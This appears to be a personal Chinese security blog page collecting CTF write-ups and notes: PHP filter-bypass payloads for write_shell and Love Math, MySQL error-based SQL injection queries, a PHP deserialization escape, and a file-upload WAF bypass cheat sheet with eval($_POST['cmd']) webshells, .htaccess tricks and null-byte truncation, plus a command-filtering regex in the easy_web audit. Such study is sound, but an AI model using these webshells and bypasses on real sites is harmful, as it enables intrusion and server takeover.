<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-红明谷CTF-2021-write-shell" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/02/09/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/" class="article-date">
  <time class="dt-published" datetime="2025-02-09T12:29:13.000Z" itemprop="datePublished">2025-02-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/02/09/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/">[红明谷CTF 2021]write_shell</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>打开靶机，看到一段代码。<br>&lt;?php<br>error_reporting(0);<br>highlight_file(<strong>FILE</strong>);<br>function check($input){<br>    if(preg_match(“&#x2F;‘| |<em>|php|;|~|\^|\+|eval|{|}&#x2F;i”,$input)){<br>        &#x2F;&#x2F; if(preg_match(“&#x2F;‘| |</em>|&#x3D;|php&#x2F;“,$input)){<br>        die(‘hacker!!!’);<br>    }else{<br>        return $input;<br>    }<br>}</p>
<p>function waf($input){<br>  if(is_array($input)){<br>      foreach($input as $key&#x3D;&gt;$output){<br>          $input[$key] &#x3D; waf($output);<br>      }<br>  }else{<br>      $input &#x3D; check($input);<br>  }<br>}</p>
<p>$dir &#x3D; ‘sandbox&#x2F;‘ . md5($_SERVER[‘REMOTE_ADDR’]) . ‘&#x2F;‘;<br>if(!file_exists($dir)){<br>    mkdir($dir);<br>}<br>switch($_GET[“action”] ?? “”) {<br>    case ‘pwd’:<br>        echo $dir;<br>        break;<br>    case ‘upload’:<br>        $data &#x3D; $_GET[“data”] ?? “”;<br>        waf($data);<br>        file_put_contents(“$dir” . “index.php”, $data);<br>}<br>?&gt;<br>先用?action&#x3D;pwd查看目录，记下访问该目录，访问该目录下index.php就是我们即将写入代码的目标文件<br>再讲讲写入，过滤的几个关键就是空格,php,; 一个一个来<br>空格过滤能用%09或\t来绕过，这两个符号都代表制表符，也就是平常使用的Tab键，四个空格<br>php主要针对php格式，换成<?= ?>就行了<br>至于;其实不用考虑 ?&gt;会自动对最后一行起到;的作用<br>提一嘴php中括起来的内容被认为是代码<br>构建payload:</p>
<p>?action&#x3D;upload&amp;data&#x3D;<?=`ls\t/`?>&#96;<br>在根目录里找到了flag,最终payload:</p>
<p>?action&#x3D;upload&amp;data&#x3D;<?=`cat\t/flllllll1112222222lag`?><br>便可得到flag{b868d874-2c12-4d6d-b3ce-ab450028e066} </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/02/09/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/" data-id="cm6xm9k5m0000csx1eb4o0fcz" data-title="[红明谷CTF 2021]write_shell" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-报错注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/02/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="article-date">
  <time class="dt-published" datetime="2025-02-07T11:15:31.000Z" itemprop="datePublished">2025-02-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/02/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">报错注入</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>updatexml<br>updatexml 是 MySQL 数据库中的一个函数，它用于更新 XML 类型的数据字段中指定路径的值。该函数接受三个参数：要更新的 XML 字段、要更新的 XML 路径以及新的值。具体来说，updatexml 函数的基本语法如下：</p>
<p>UPDATEXML(xml_document, XPath_string, new_value)<br>xml_document：XML文档对象的名称，是一个字符串格式。<br>XPath_string：Xpath格式的字符串，用于指定需要更新的XML节点的路径。<br>new_value：新的值，用于替换查找到的符合条件的XML节点内容，也是一个字符串格式。<br>updatexml 函数的作用是改变文档中符合条件的节点的值。当 XPath_string 格式出现错误时，MySQL 会爆出 XPath 语法错误（xpath syntax error），这一点常被用于 SQL 注入攻击中，通过构造错误的 XPath 表达式来触发错误，从而获取数据库信息。例如，攻击者可能会尝试以下 SQL 语句来探测数据库名称：</p>
<p>‘ and updatexml(1,concat(0x7e,database(),0x7e),1)#</p>
<p>floor<br>floor的报错原理：利用select count(*),floor(rand(0)*2)x from information_schema.character_sets group by x;导致数据库报错，通过concat函数连接注入语句与floor(rand(0)*2)函数，实现将注入结果与报错信息回显的注入方式。</p>
<p>rand()函数<br>rand()可以产生一个在0和1之间的随机数</p>
<p>floor (rand(0)<em>2)函数<br>floor函数的作用就是返回小于等于括号内该值的最大整数。<br>rand()本身是返回0~1的随机数，但在后面</em>2就变成了返回0~2之间的随机数。<br>配合上floor函数就可以产生确定的两个数，即0和1。<br>并且结合固定的随机数种子0，它每次产生的随机数列都是相同的值。<br>此处的myclass 表为含有四行数据的表。<br>结合上述的函数，每次产生的随机数列都是 0 1 1 0<br>group by 函数<br>group by 函数，作用就是分类汇总。</p>
<p>exp</p>
<p>MySQL中的EXP()函数用于将E提升为指定数字X的幂，这里E(2.718281 …)是自然对数的底数。<br>EXP(X)<br>该函数返回E的X次方后的值，如下所示：</p>
<p>mysql&gt; select exp(3);<br>+——————–+<br>| exp(3)             |<br>+——————–+<br>| 20.085536923187668 |<br>+——————–+<br>1 row in set (0.00 sec)</p>
<p>mysql&gt;<br>我们可以用 ~ 运算符按位取反的方式得到一个最大值，该运算符也可以处理一个字符串，经过其处理的字符串会变成大一个很大整数足以超过 MySQL 的 Double 数组范围，从而报错输出：</p>
<p>mysql&gt; select ~(select version());<br>+———————-+<br>| ~(select version())  |<br>+———————-+<br>| 18446744073709551610 |<br>+———————-+<br>1 row in set, 1 warning (0.00 sec)</p>
<p>mysql&gt; select exp(<del>(select * from(select version())x));<br>ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(</del>((select ‘5.5.29’ from dual)))’</p>
<p>mysql&gt; select exp(<del>(select * from(select user())x));<br>ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(</del>((select ‘root@localhost’ from dual)))’</p>
<p>mysql&gt; select exp(<del>(select * from(select database())x));<br>ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(</del>((select ‘ctf’ from dual)))’<br>mysql&gt;<br>如上图所示，成功报错并输出了数据。但是事实证明，在 MySQL&gt;5.5.53 之后，exp() 报错不能返回我们的查询结果，而只会得到一个报错：</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/02/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" data-id="cm6uorbhc00007sx1226u0up5" data-title="报错注入" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CISCN-2019-初赛-Love-Math" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/02/02/CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math/" class="article-date">
  <time class="dt-published" datetime="2025-02-02T11:00:58.000Z" itemprop="datePublished">2025-02-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/02/02/CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math/">[CISCN 2019 初赛]Love Math</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>打开靶机，便看到一段代码<br>&lt;?php<br>error_reporting(0);<br>&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag<br>if(!isset($_GET[‘c’])){<br>    show_source(__FILE__);<br>}else{<br>    &#x2F;&#x2F;例子 c&#x3D;20-1<br>    $content &#x3D; $_GET[‘c’];<br>    if (strlen($content) &gt;&#x3D; 80) {<br>        die(“太长了不会算”);<br>    }<br>    $blacklist &#x3D; [‘ ‘, ‘\t’, ‘\r’, ‘\n’,’&#39;‘, ‘“‘, ‘&#96;’, ‘[‘, ‘]‘];<br>    foreach ($blacklist as $blackitem) {<br>        if (preg_match(‘&#x2F;‘ . $blackitem . ‘&#x2F;m’, $content)) {<br>            die(“请不要输入奇奇怪怪的字符”);<br>        }<br>    }<br>    &#x2F;&#x2F;常用数学函数<a target="_blank" rel="noopener" href="http://www.w3school.com.cn/php/php_ref_math.asp">http://www.w3school.com.cn/php/php_ref_math.asp</a><br>    $whitelist &#x3D; [‘abs’, ‘acos’, ‘acosh’, ‘asin’, ‘asinh’, ‘atan2’, ‘atan’, ‘atanh’, ‘base_convert’, ‘bindec’, ‘ceil’, ‘cos’, ‘cosh’, ‘decbin’, ‘dechex’, ‘decoct’, ‘deg2rad’, ‘exp’, ‘expm1’, ‘floor’, ‘fmod’, ‘getrandmax’, ‘hexdec’, ‘hypot’, ‘is_finite’, ‘is_infinite’, ‘is_nan’, ‘lcg_value’, ‘log10’, ‘log1p’, ‘log’, ‘max’, ‘min’, ‘mt_getrandmax’, ‘mt_rand’, ‘mt_srand’, ‘octdec’, ‘pi’, ‘pow’, ‘rad2deg’, ‘rand’, ‘round’, ‘sin’, ‘sinh’, ‘sqrt’, ‘srand’, ‘tan’, ‘tanh’];<br>    preg_match_all(‘&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;‘, $content, $used_funcs);<br>    foreach ($used_funcs[0] as $func) {<br>        if (!in_array($func, $whitelist)) {<br>            die(“请不要输入奇奇怪怪的函数”);<br>        }<br>    }<br>    &#x2F;&#x2F;帮你算出答案<br>    eval(‘echo ‘.$content.’;’);<br>}<br>进行简单的代码审计，一开始是限制了传入参数的长度，然后有黑名单过滤，最后是白名单，这里的白名单是常用的数学函数。<br>看代码的细节,接收一个get传入的参数c,并且参数c的长度不能超过80,还不能在黑名单</p>
<p>$blacklist &#x3D; [‘ ‘, ‘\t’, ‘\r’, ‘\n’,’&#39;‘, ‘“‘, ‘&#96;’, ‘’]; 里面   不能含有空格 \t \r \n 单双引号 中括号[]</p>
<p>又给出了一个白名单,里面是很多的数学函数,然后进行正则匹配,得到的结果赋值给$used_funcs</p>
<p>$used_funcs[0] 包含了所有完整的匹配字符串,$used_funcs[0] 里面的所有数据都要在白名单中</p>
<p>preg_match_all(‘&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;‘, $content, $used_funcs);<br>首先先谁便输一些数，看看能否进行命令执行。例如输入&#x2F;?c&#x3D;19-1<br>发现出来18.<br>这里黑名单过滤了不少东西，常规的cat&#x2F;flag都不能使用了，这里有个知识点是php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘cat&#x2F;flag’);</p>
<p>$a&#x3D;’system’;<br>$a(‘cat&#x2F;flag’);<br>这里使用的传参是?c&#x3D;($_GET[pi])($_GET[abs])&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag<br>但是这里的_GET是无法进行直接替换，而且[]也被黑名单过滤了<br>这里就需要去了解一下他给的白名单里面的函数了<br>这里说一下需要用到的几个函数<br>这里先将_GET来进行转换的函数<br>这里的_GET是ASCII 字符，用在线工具将_GET转换为十六进制<br>而hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。hex2bin(5f 47 45 54) 就是 _GET,<br>这里的hex2bin()函数可以通过base_convert()函数来进行转换</p>
<p>base_convert()函数能够在任意进制之间转换数字</p>
<p>这里的hex2bin可以看做是36进制，用base_convert来转换将在10进制的数字转换为16进制就可以出现hex2bin</p>
<p>hex2bin&#x3D;base_convert(37907361743,10,36)<br>最终的payload：</p>
<p>&#x2F;?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag<br>最后在url中传参，便得到flag&#x3D;{a9186dbf-4a15-4f71-b824-ab383599edbc}。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/02/02/CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math/" data-id="cm6niyfln0000wgx13una5ylf" data-title="[CISCN 2019 初赛]Love Math" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-安洵杯-2019-easy-serialize-php-1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/02/02/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php-1/" class="article-date">
  <time class="dt-published" datetime="2025-02-02T10:28:28.000Z" itemprop="datePublished">2025-02-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/02/02/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php-1/">[安洵杯 2019]easy_serialize_php 1</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>首先进入环境，看到source_code，进入发现代码。<br>&lt;?php</p>
<p>$function &#x3D; @$_GET[‘f’];</p>
<p>function filter($img){<br>    $filter_arr &#x3D; array(‘php’,’flag’,’php5’,’php4’,’fl1g’);<br>    $filter &#x3D; ‘&#x2F;‘.implode(‘|’,$filter_arr).’&#x2F;i’;<br>    return preg_replace($filter,’’,$img);<br>}</p>
<p>if($_SESSION){<br>    unset($_SESSION);<br>}</p>
<p>$_SESSION[“user”] &#x3D; ‘guest’;<br>$_SESSION[‘function’] &#x3D; $function;</p>
<p>extract($_POST);</p>
<p>if(!$function){<br>    echo ‘<a href="index.php?f=highlight_file">source_code</a>‘;<br>}</p>
<p>if(!$_GET[‘img_path’]){<br>    $_SESSION[‘img’] &#x3D; base64_encode(‘guest_img.png’);<br>}else{<br>    $_SESSION[‘img’] &#x3D; sha1(base64_encode($_GET[‘img_path’]));<br>}</p>
<p>$serialize_info &#x3D; filter(serialize($_SESSION));</p>
<p>if($function &#x3D;&#x3D; ‘highlight_file’){<br>    highlight_file(‘index.php’);<br>}else if($function &#x3D;&#x3D; ‘phpinfo’){<br>    eval(‘phpinfo();’); &#x2F;&#x2F;maybe you can find something in here!<br>}else if($function &#x3D;&#x3D; ‘show_image’){<br>    $userinfo &#x3D; unserialize($serialize_info);<br>    echo file_get_contents(base64_decode($userinfo[‘img’]));<br>}<br>进行代码审计，</p>
<p>$function &#x3D; @$_GET[‘f’];</p>
<p>function filter($img){<br>    $filter_arr &#x3D; array(‘php’,’flag’,’php5’,’php4’,’fl1g’);<br>    $filter &#x3D; ‘&#x2F;‘.implode(‘|’,$filter_arr).’&#x2F;i’;<br>    return preg_replace($filter,’’,$img);<br>}</p>
<p>if($_SESSION){<br>    unset($_SESSION);<br>}<br>mplode() 函数返回一个由数组元素组合成的字符串<br>preg_replace 函数执行一个正则表达式的搜索和替换。<br>将敏感字符（‘php’,‘flag’,‘php5’,‘php4’,‘fl1g’）替换成 空格</p>
<p>可以看得到有执行phpinfo()的语句，尝试调用，然后搜索flag相关的内容，没有结果，在搜索f1ag相关的内容<br>得到了flag文件的名字。d0g3_flag.php.<br>我们主要用到的就这一句</p>
<p>echo file_get_contents(base64_decode($userinfo[‘img’]));<br>lag和php是敏感字符，在使用的时候被过滤掉了，但序列化记录的字符串长度没有过滤掉，所以在序列化的时候<br>s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;s:1:”2”;}被当作了原来的value<br>在 echo file_get_contents(base64_decode($userinfo[‘img’]));实现了读取flag的，目的<br>实现了逃逸<br>在url中输入<a target="_blank" rel="noopener" href="http://b363f559-5fb2-41f5-ac12-03f253d347d6.node5.buuoj.cn:81/index.php?f=show_image">http://b363f559-5fb2-41f5-ac12-03f253d347d6.node5.buuoj.cn:81/index.php?f=show_image</a></p>
<p>将&#x2F;d0g3_fllllllag进行base64编码后上传，可获得 flag<br>_SESSION[user]&#x3D;flagflagflagflagflagphp&amp;_SESSION[function]&#x3D;”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;s:1:”1”;s:1:”2”;}<br>便可得到flag&#x3D; flag{a925d937-3544-40a5-a7e8-4b8c9af9e50b} </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/02/02/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php-1/" data-id="cm6niagmt0000g8x12txz6lgj" data-title="[安洵杯 2019]easy_serialize_php 1" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-‘【文件上传WAF绕过】’" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/02/01/%E2%80%98%E3%80%90%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0WAF%E7%BB%95%E8%BF%87%E3%80%91%E2%80%99/" class="article-date">
  <time class="dt-published" datetime="2025-02-01T10:59:38.000Z" itemprop="datePublished">2025-02-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/02/01/%E2%80%98%E3%80%90%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0WAF%E7%BB%95%E8%BF%87%E3%80%91%E2%80%99/">‘【文件上传WAF绕过】’</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>文件上传常用waf绕过木马<br>GIF89a</p>
<script language="php">
@eval($_POST['cmd']);phpinfo();
</script>


<p>&#x2F;&#x2F;校验文件内容<br>1:校验你内里里面有没有图片头<br>GIF89a</p>
<p>2:校验你的内容 有没有木马格式<br><?php eval($_POST['cmd']);?></p>
<p>&#x2F;&#x2F;以下两种情况上变形校验:<br>一.校验:内容里面有没有&lt;?<br>GIF89a</p>
<script language="php">
@eval($_POST['cmd']);phpinfo();
</script>
<p>二.校验:内容里面有没有：php<br>GIF89a<br>php&lt;?&#x3D;@eval($_POST[‘cmd’]);</p>
<p>三.如果过滤了php后缀<br>利用phtml<br>php空格<br>php.</p>
<p>四.文件名大小写绕过<br>Php、pHp</p>
<p>名单列表绕过<br>php5、php7、php9<br>.php.rar</p>
<p>00截断<br>&#x2F;&#x2F;00截断适用于很多场景，<br>只要目标没有执行重命名操作，<br>都可以尝试00截断。</p>
<p>小马.jpg改为&#x3D;&#x3D;&gt;小马.php%00.jpg</p>
<p>上传前要把%00给url解码</p>
<p>.htaccess绕过(apache浏览器使用)<br>一定要是.jpg文件<br>第一种<br>&#x2F;&#x2F;指定xiaoma.jpg这个文件<br>&lt;FilesMatch “xiaoma.jpg”&gt;<br>        SetHandler application&#x2F;x-httpd-php<br></FilesMatch></p>
<p>&#x2F;&#x2F;绕过步骤：<br>1.先上传.htaccess文件上去<br>&lt;FilesMatch “xiaoma.jpg”&gt;<br>        SetHandler application&#x2F;x-httpd-php<br></FilesMatch></p>
<p>2.再上传xiaoma.jpg木马文件，<br>GIF89a<br><?php
@eval($_POST['cmd']);
?></p>
<p>3.再点击那个文件名为xiaoma.jpg的发送<br>就可以利用<strong>upload&#x2F;xiaoma.jpg</strong>访问上传文件<br>（<a target="_blank" rel="noopener" href="http://127.0.0.1/uploadlab/upload/xiaoma.jpg%EF%BC%89">http://127.0.0.1/uploadlab/upload/xiaoma.jpg）</a></p>
<p> 重发两个包：发送给重发器<br>访问这个xiaoma.jpg，出现GIF89a，上传成功<br>第二种<br>.htaccess内容：<br>AddType application&#x2F;x-httpd-php .jpg<br>&#x2F;&#x2F;将.jpg文件按照php代码来执行</p>
<p>1.首先上传.htaccess文件上去</p>
<p>2.然后再上传一个.jpg文件上去<br>GIF89a<br><?php
@eval($_POST['cmd']);
?></p>
<p>然后再用POST的cmd命令执行命令<br>cmd&#x3D;system(“ls &#x2F;“);</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/02/01/%E2%80%98%E3%80%90%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0WAF%E7%BB%95%E8%BF%87%E3%80%91%E2%80%99/" data-id="cm6m37khd0000g0x19v0g9e6y" data-title="‘【文件上传WAF绕过】’" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-安洵杯-2019-easy-web" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/01/26/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/" class="article-date">
  <time class="dt-published" datetime="2025-01-26T12:32:20.000Z" itemprop="datePublished">2025-01-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/01/26/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/">[安洵杯 2019]easy_web</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>首先打开靶机，发现是一段吐槽（web狗如何在险恶的ctf世界中存活?),图片的信息不多，便发现在url中有&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;<br>发现img等于的好像是base64编码，解码后发现好像还是base64编码，再解码得3535352e706e67，这一串好像是16进制，解码得555.png。由此便可知道要将index.php先进行16进制的编码再进行两次base64编码，便得到TmprMlpUWTBOalUzT0RKbE56QTJPRGN3<br>在url中传参得，看到变化不大，便查看源代码，data:image&#x2F;gif;base64,PD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMIHx8IH4gRV9OT1RJQ0UpOwpoZWFkZXIoJ2NvbnRlbnQtdHlwZTp0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOCcpOwokY21kID0gJF9HRVRbJ2NtZCddOwppZiAoIWlzc2V0KCRfR0VUWydpbWcnXSkgfHwgIWlzc2V0KCRfR0VUWydjbWQnXSkpIAogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2ltZz1UWHBWZWs1VVRURk5iVlV6VFVSYWJFNXFZejAmY21kPScpOwokZmlsZSA9IGhleDJiaW4oYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRfR0VUWydpbWcnXSkpKTsKCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwgIiIsICRmaWxlKTsKaWYgKHByZWdfbWF0Y2goIi9mbGFnL2kiLCAkZmlsZSkpIHsKICAgIGVjaG8gJzxpbWcgc3JjID0iLi9jdGYzLmpwZWciPic7CiAgICBkaWUoInhpeGnvvZ4gbm8gZmxhZyIpOwp9IGVsc2UgewogICAgJHR4dCA9IGJhc2U2NF9lbmNvZGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpKTsKICAgIGVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIiAuICR0eHQgLiAiJz48L2ltZz4iOwogICAgZWNobyAiPGJyPiI7Cn0KZWNobyAkY21kOwplY2hvICI8YnI+IjsKaWYgKHByZWdfbWF0Y2goIi9sc3xiYXNofHRhY3xubHxtb3JlfGxlc3N8aGVhZHx3Z2V0fHRhaWx8dml8Y2F0fG9kfGdyZXB8c2VkfGJ6bW9yZXxiemxlc3N8cGNyZXxwYXN0ZXxkaWZmfGZpbGV8ZWNob3xzaHxcJ3xcInxcYHw7fCx8XCp8XD98XFx8XFxcXHxcbnxcdHxccnxceEEwfFx7fFx9fFwofFwpfFwmW15cZF18QHxcfHxcXCR8XFt8XF18e3x9fFwofFwpfC18PHw+L2kiLCAkY21kKSkgewogICAgZWNobygiZm9yYmlkIH4iKTsKICAgIGVjaG8gIjxicj4iOwp9IGVsc2UgewogICAgaWYgKChzdHJpbmcpJF9QT1NUWydhJ10gIT09IChzdHJpbmcpJF9QT1NUWydiJ10gJiYgbWQ1KCRfUE9TVFsnYSddKSA9PT0gbWQ1KCRfUE9TVFsnYiddKSkgewogICAgICAgIGVjaG8gYCRjbWRgOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICgibWQ1IGlzIGZ1bm55IH4iKTsKICAgIH0KfQoKPz4KPGh0bWw+CjxzdHlsZT4KICBib2R5ewogICBiYWNrZ3JvdW5kOnVybCguL2JqLnBuZykgIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyOwogICBiYWNrZ3JvdW5kLXNpemU6Y292ZXI7CiAgIGJhY2tncm91bmQtYXR0YWNobWVudDpmaXhlZDsKICAgYmFja2dyb3VuZC1jb2xvcjojQ0NDQ0NDOwp9Cjwvc3R5bGU+Cjxib2R5Pgo8L2JvZHk+CjwvaHRtbD4&#x3D;’<br>对其进行解码得<br>&lt;?php<br>error_reporting(E_ALL || ~ E_NOTICE);<br>header(‘content-type:text&#x2F;html;charset&#x3D;utf-8’);<br>$cmd &#x3D; $_GET[‘cmd’];<br>if (!isset($_GET[‘img’]) || !isset($_GET[‘cmd’]))<br>    header(‘Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;’);<br>$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[‘img’])));</p>
<p>$file &#x3D; preg_replace(“&#x2F;[^a-zA-Z0-9.]+&#x2F;“, “”, $file);<br>if (preg_match(“&#x2F;flag&#x2F;i”, $file)) {<br>    echo ‘<img src ="./ctf3.jpeg">‘;<br>    die(“xixi～ no flag”);<br>} else {<br>    $txt &#x3D; base64_encode(file_get_contents($file));<br>    echo “<img src='data:image/gif;base64," . $txt . "'></img>“;<br>    echo “<br>“;<br>}<br>echo $cmd;<br>echo “<br>“;<br>if (preg_match(“&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|’|”|<code>|;|,|*|?|\|\\|n|t|r|xA0|&#123;|&#125;|(|)|&amp;[^d]|@|||\$|[|]|&#123;|&#125;|(|)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;     echo(&quot;forbid ~&quot;);     echo &quot;&lt;br&gt;&quot;; &#125; else &#123;     if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) &#123;         echo </code>$cmd&#96;;<br>    } else {<br>        echo (“md5 is funny ~”);<br>    }<br>}</p>
<p>?&gt;</p>
<html>
<style>
  body{
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:#CCCCCC;
}
</style>
<body>
</body>
</html>

<p>进行代码审计if (preg_match(“&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|’|”|<code>|;|,|*|?|\|\\|n|t|r|xA0|&#123;|&#125;|(|)|&amp;[^d]|@|||\$|[|]|&#123;|&#125;|(|)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;          echo(&quot;forbid ~&quot;);     echo &quot;&lt;br&gt;&quot;; &#125; else &#123;     if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) &#123;    //a和b的内容不一样但是需要md5值一样         echo </code>$cmd&#96;;          &#x2F;&#x2F;将cmd当成系统命令执行并输出<br>    } else {<br>        echo (“md5 is funny ~”);<br>    }<br>}</p>
